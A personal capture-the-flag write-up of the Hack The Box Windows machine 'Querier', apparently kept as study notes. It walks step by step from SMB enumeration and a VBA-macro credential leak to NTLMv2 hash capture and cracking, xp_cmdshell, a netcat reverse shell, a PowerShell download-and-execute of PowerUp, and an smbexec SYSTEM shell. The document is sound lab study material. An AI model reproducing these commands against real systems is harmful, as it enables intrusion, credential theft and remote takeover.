---
date: 2024-10-14
title: Querier HTB Write-Up
machine_ip: 10.10.10.125
os: Windows
difficulty: Medium
my_rating: 2
tags:
  - Windows
  - PrivEsc
  - SMB
  - SQL
  - MSSQL
  - nc
  - rustscan
  - olevba
  - nmap
  - smbclient
  - mssqlclient
  - smbexec
  - PowerShell
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Rustscan
```
┌──(root㉿kali)-[~/Downloads]
└─# rustscan -a 10.10.10.125 -t 500 -b 500 -- -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.125:135
Open 10.10.10.125:139
Open 10.10.10.125:445
Open 10.10.10.125:1433
Open 10.10.10.125:5985
Open 10.10.10.125:47001
Open 10.10.10.125:49665
Open 10.10.10.125:49664
Open 10.10.10.125:49666
Open 10.10.10.125:49667
Open 10.10.10.125:49668
Open 10.10.10.125:49669
Open 10.10.10.125:49670
Open 10.10.10.125:49671
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC -Pn" on ip 10.10.10.125
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-14 22:28 UTC
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:28
Completed NSE at 22:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:28
Completed NSE at 22:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:28
Completed NSE at 22:28, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 22:28
Completed Parallel DNS resolution of 1 host. at 22:28, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:28
Scanning 10.10.10.125 [14 ports]
Discovered open port 49664/tcp on 10.10.10.125
Discovered open port 49665/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 49669/tcp on 10.10.10.125
Completed Connect Scan at 22:28, 0.19s elapsed (14 total ports)
Initiating Service scan at 22:28
Scanning 14 services on 10.10.10.125
Service scan Timing: About 50.00% done; ETC: 22:30 (0:00:56 remaining)
Completed Service scan at 22:29, 55.60s elapsed (14 services on 1 host)
NSE: Script scanning 10.10.10.125.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 8.46s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 1.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
Nmap scan report for 10.10.10.125
Host is up, received user-set (0.095s latency).
Scanned at 2024-10-14 22:28:20 UTC for 65s

PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-10-14T22:25:21
| Not valid after:  2054-10-14T22:25:21
| MD5:   0e51:5f7d:ee92:67f4:aabe:247f:a08e:593d
| SHA-1: 2b16:2544:b49d:7101:08d8:dbe6:4ebd:26a3:9fcb:d71e
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFKSdTWCFoZVKJhs6zwQLSDANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQxMDE0MjIyNTIxWhgPMjA1NDEwMTQyMjI1MjFaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALC7jDdc
| xlKNOw8eq/qlgozIlYOneLyRSc0hRFgv/eHPXFleU9fsmYc15z3G/QrfoUFS/3b6
| uXcCHQq41UfeqqfgBIY3vev6Els1zGBSxUUU1w5xaA/BeZtOvVIoNxDLIHBzVDH3
| dqRsdJx34Z5S98/xpzI8zAUTqQ/eOxL88OddGy05kqCDun3yHZ4GIzet91L5YZ7y
| GL/mwDlSvCcM515Ucd05qmgRq+KjJHppuUBb8uD1k2MIEQmrUnpTv3XI/aN6HAHp
| jMcep6popHwxkNqzTBJ3zCTAfN1YmsNHb9tYS2ZSh1IFmp0EMPdt5M5LRELtn7az
| 0zb/xHCtYXnMNPUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAQETzNbpkXgQuAgkr
| 35lybrmbjAav5eWGZs17kevZISTeKJ55GtJ0oHoTB7fFynp2LQIXMDmyDnSQaEpv
| DxZGqpDxdnJebB7J2g6HBSXiPfRpQSgMv/F03KHJeCu0oQq6Tj337LUvD1zCF9TJ
| UW1Aw4M3waLmlgSHpMWW/w7zYGx4AxJ+CmrvDpJq9/msucouWVH0GHgG9YWoBvxI
| mSahV7owc0OGkC0cA9jwk7NK4c9Kuf8S9b3DdxhEdgv1+SN/htirPUYgP0XFx3nK
| ZUnV6QgfKupPHGsO1maT2KiKUva9qZ1ZBneF3zl8EvG0ob8PCMrVLM5tWLmrU+cT
| Y2KX9A==
|_-----END CERTIFICATE-----
|_ssl-date: 2024-10-14T22:29:24+00:00; -1s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10624/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 25952/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40571/udp): CLEAN (Timeout)
|   Check 4 (port 37568/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2024-10-14T22:29:18
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:29
Completed NSE at 22:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.66 seconds
```
- #MSSQL server is open
- `nmap` enumeration of port 1433
```
┌──(root㉿kali)-[~/Downloads]
└─# nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.10.10.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 15:42 PDT
Nmap scan report for 10.10.10.125
Host is up (0.099s latency).

Bug in ms-sql-hasdbaccess: no string output.
Bug in ms-sql-dac: no string output.
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-tables: 
|   10.10.10.125:1433: 
|_[10.10.10.125:1433]
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-config: 
|   10.10.10.125:1433: 
|_  ERROR: Bad username or password
| ms-sql-dump-hashes: 
|_  10.10.10.125:1433: ERROR: Bad username or password
| ms-sql-empty-password: 
|_  10.10.10.125:1433: 
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```
- Microsoft SQL Server 2017

- `smbclient` #SMB #smbclient 
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient -U "" -L \\\\10.10.10.125\\
Password for [WORKGROUP\]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- We can login to the `IPC$` share and `Reports` share!
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient \\\\10.10.10.125\\Reports$
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \>
```
- We download the `Currency Volume Reports.xlsm` file to view
- We find Macros and "Access2Base" in "Application Macros & Dialog". 
	- Initially appeared the next step would be to run a command to query for sensitive information within this macro, but it is read-only
- #olevba to parse OLE and OpenXML files (MS Office documents)
```
┌──(root㉿kali)-[~/Downloads]
└─# olevba Currency\ Volume\ Report.xlsm 
olevba 0.60.2 on Python 2.7.18 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

WARNING  /usr/local/lib/python2.7/dist-packages/msoffcrypto/method/ecma376_agile.py:8: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
```
- This output prints plainly the creds `reporting:PcwTWTHRwryjc$c6` for the database.

- Let's try to connect:
```
┌──(root㉿kali)-[~/Downloads]
└─# mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> 
```
- Success

- Enumerating the database
```
SQL (QUERIER\reporting  reporting@volume)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

volume                   0  
```
- Enumerating the users
```
┌──(root㉿kali)-[~/Downloads]
└─# mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> enum_users
UserName             RoleName   LoginName           DefDBName   DefSchemaName       UserID                                                           SID   
------------------   --------   -----------------   ---------   -------------   ----------   -----------------------------------------------------------   
dbo                  db_owner   NULL                NULL        dbo             b'1         '   b'010500000000000515000000e5cfd9d970fd97dacb23a5d1f4010000'   

guest                public     NULL                NULL        guest           b'2         '                                                         b'00'   

INFORMATION_SCHEMA   public     NULL                NULL        NULL            b'3         '                                                          NULL   

reporting            db_owner   QUERIER\reporting   volume      dbo             b'5         '   b'010500000000000515000000e5cfd9d970fd97dacb23a5d1ea030000'   

sys                  public     NULL                NULL        NULL            b'4         '                                                          NULL 
```
- Enumerating logins
```
SQL (QUERIER\reporting  reporting@volume)> enum_logins
name                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                  SQL_LOGIN                 1          1               0             0            0              0           0           0           0   

QUERIER\reporting   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
```
- It appears a `sysadmin` is also logged in, a service principal CANNOT be imerpsonated though
- Change database to `msdb` and enumerate further
```
SQL (QUERIER\reporting  reporting@volume)> USE msdb
[%] USE msdb
ENVCHANGE(DATABASE): Old Value: volume, New Value: msdb
INFO(QUERIER): Line 1: Changed database context to 'msdb'.
```

- (Do this first next time) Check my current user permissions with:
```
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```
- My permissions
```
SQL (QUERIER\reporting  reporting@volume)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

```

- Better way to check databases available:
```
SELECT name FROM master.sys.databases
```
- Databases
```
SQL (QUERIER\reporting  reporting@volume)> SELECT name FROM master.sys.databases
name     
------   
master   

tempdb   

model    

msdb     

volume   
```
- Found nothing of interest here so consulting a [walkthrough](https://0xdf.gitlab.io/2019/06/22/htb-querier.html) for this one..

# Foothold
- gain shell via exploit
- Capture Net-NTLMv2 #xp_dirtree #SQL 
	- "In the box that Querier replaced, Giddy, there was an SQL injection in a SQL Server instance where I used the xp_dirtree command to get it to connect to me over SMB where I was listening with responder to capture the Net-NTLMv2. (note posts on ntlmv2 and giddy). I’ll do the same thing here, just with direct access instead of SQLi."
	- "I’ll use xp_dirtree to load a file, and I’ll tell the db that the file is in an SMB share on my hosts. The server will try to authenticate to my host, where responder will collect the Net-NTLMv2. For more details, check out the [Giddy writeup] and/or [my post on Net-NTLMv2]."
- Start #Responder 
```
┌──(root㉿kali)-[~/Downloads]
└─# responder -I tun0 -dwv    
```
- Next, issue the connect to load a file using `xp_dirtree` from an SMB share (that doesn’t exist) on my host:
```
SQL (QUERIER\reporting  reporting@volume)> exec master.dbo.xp_dirtree"\\10.10.14.5\myshare",1,1;
```
- Hash captured
```
[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:7ca03b544fa996e6:E68B06D1562EA35A7C5612C3DC0EA244:01010000000000008001E1D4591EDB01ED49D4784EA5423E000000000200080051004E003000500001001E00570049004E002D0030004B0036004300530041004500510046005100370004003400570049004E002D0030004B003600430053004100450051004600510037002E0051004E00300050002E004C004F00430041004C000300140051004E00300050002E004C004F00430041004C000500140051004E00300050002E004C004F00430041004C00070008008001E1D4591EDB0106000400020000000800300030000000000000000000000000300000427766C25BC16C877C6FC32F5FF58EC5493309D2982DD8EE543021A516E968D90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
```

- Crack the hash - use #Responder log file of captured hash... easier
```
┌──(root㉿kali)-[~/Downloads]
└─# hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.125.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 14991/30047 MB (4096 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQL-SVC::QUERIER:7ca03b544fa996e6:e68b06d1562ea35a7c5612c3dc0ea244:01010000000000008001e1d4591edb01ed49d4784ea5423e000000000200080051004e003000500001001e00570049004e002d0030004b0036004300530041004500510046005100370004003400570049004e002d0030004b003600430053004100450051004600510037002e0051004e00300050002e004c004f00430041004c000300140051004e00300050002e004c004f00430041004c000500140051004e00300050002e004c004f00430041004c00070008008001e1d4591edb0106000400020000000800300030000000000000000000000000300000427766c25bc16c877c6fc32f5ff58ec5493309d2982dd8ee543021a516e968d90a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:corporate568
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQL-SVC::QUERIER:7ca03b544fa996e6:e68b06d1562ea35...000000
Time.Started.....: Mon Oct 14 17:06:03 2024 (4 secs)
Time.Estimated...: Mon Oct 14 17:06:07 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2471.5 kH/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8964096/14344385 (62.49%)
Rejected.........: 0/8964096 (0.00%)
Restore.Point....: 8957952/14344385 (62.45%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: correita.54 -> corcant
Hardware.Mon.#1..: Util: 71%

Started: Mon Oct 14 17:06:03 2024
Stopped: Mon Oct 14 17:06:08 2024
```
- Now we have the creds of `MSSQL-SVC:corporate568`

- Logged in as `MSSQL-SVC`
```
┌──(root㉿kali)-[~/Downloads]
└─# mssqlclient.py QUERIER/MSSQL-SVC@10.10.10.125 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   

NULL
```

- Using the `xp_cmdshell` let's get a real shell by transferring `nc` over to RHOST so we can catch a shell
	- Make sure to `enable_xp_cmdshell` to allow cmds **IMPORTANT**
	- `python -m SimpleHTTPServer 80`
	- `xp_cmdshell "powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\nc.exe http://10.10.14.5/nc.exe"`
	- `nc -lnvp 443`
- Send shell to listener
```
xp_cmdshell "C:\Users\mssql-svc\nc.exe -e cmd.exe 10.10.14.5 443"
```
- Caught shell
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.125] 49692
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```

- User flag - mssql-svc
```
C:\Users\mssql-svc\Desktop>type user.txt
type user.txt
d9ed27c6e5126ab162f325652c877bac
```

# PrivEsc
[[Privilege Escalation]], [[🦊TCM Security/PrivEsc_Windows/1_Initial_Enumeration]]
- escalate to root
- PowerUp.ps1 #PowerUp is always first to try.
	- Transfer over using using #PowerShell 
	- `powershell -ep bypass`
	- Start #SimpleHTTPServer in folder with #PowerUp 
```RHOST
IEX (New-Object Net.WebClient).downloadstring("http://10.10.14.5/PowerUp.ps1")        
```
- Then `Invoke-AllChecks`
	- #PowerUp is awesome and finds 5 sepearte #PrivEsc points to follow
	- The easiest of which is the administrator's cleartet password in the cached GPP Files!
	- `Administrator:MyUnclesAreMarioAndLuigi!!1!`
- Now we need a shell as admin #smbexec 
```
┌──(root㉿kali)-[~]
└─# smbexec.py administrator@10.10.10.125                               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

- Root flag - Administrator
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
f972230e8a2946ede9f48b97b81a6f2e
```
*smbexec.py cannot use cd, has to be full path*

Done. I learned during this box to take breaks and NOT to try to complete 2 Medium boxes in one day. It is unrealistic and only sets myself up for failure.
	- also learned #olevba , more #MSSQL and of course all the other tools <3